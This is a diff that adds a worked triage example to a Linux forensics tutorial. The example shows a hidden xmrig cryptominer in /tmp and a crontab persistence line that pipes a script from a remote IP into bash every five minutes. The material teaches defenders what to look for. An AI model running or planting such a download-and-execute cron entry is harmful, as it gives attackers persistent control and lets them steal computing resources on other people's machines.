@@ -33,3 +33,24 @@ One notable contrast with Windows is resource efficiency: a minimal Linux server
 The terminal is the primary interface through which meaningful work gets done on a Linux system, typically presenting a prompt indicating the current user, hostname, and working directory. A core set of commands recurs constantly: `whoami` reveals the currently logged-in user; `ls` lists the contents of a directory; `cd` changes the current working directory; `cat` displays the contents of a file; `pwd` reports the full path of the current location; `grep` searches for specific text within a file or a stream of output; `find` locates files across the filesystem by name or other criteria; `ps aux` lists all currently running processes; `file` identifies a file's actual type based on its underlying content rather than trusting its extension; and `xxd` renders a file's raw contents as a hexadecimal dump for closer inspection.
 
 Certain filesystem locations carry particular significance during investigative work. The `/var/log/` directory holds the bulk of system logs and serves as the primary source of evidence during an investigation. The `/tmp/` directory is frequently writable by any user and is a common landing spot for files dropped by malicious activity. The `/etc/passwd` file lists system user accounts. The `/etc/crontab` file defines scheduled tasks and is a common location where persistence mechanisms are hidden. The `/proc/` directory exposes live information about currently running processes.
+
+## Practical Example — A Quick Triage Sequence
+
+```bash
+$ whoami
+ubuntu
+
+$ ps aux --sort=-%cpu | head -5
+USER   PID  %CPU %MEM COMMAND
+root   4471  87.2  1.1 /tmp/.hidden/xmrig -c config.json
+ubuntu 1022   2.1  0.8 nginx: worker process
+root      1   0.0  0.1 /sbin/init
+
+$ file /tmp/.hidden/xmrig
+/tmp/.hidden/xmrig: ELF 64-bit LSB executable, x86-64
+
+$ cat /etc/crontab | grep -v "^#"
+*/5 * * * * root curl -s http://185.220.101.4/update.sh | bash
+```
+
+This short sequence tells a full story: a process running from a hidden folder in `/tmp/` is consuming 87% CPU — a classic sign of unauthorized cryptomining. Checking its real file type confirms it's an executable, not the config file its name might suggest. The crontab entry shows how it's staying persistent, silently re-downloading and re-executing a remote script every five minutes.
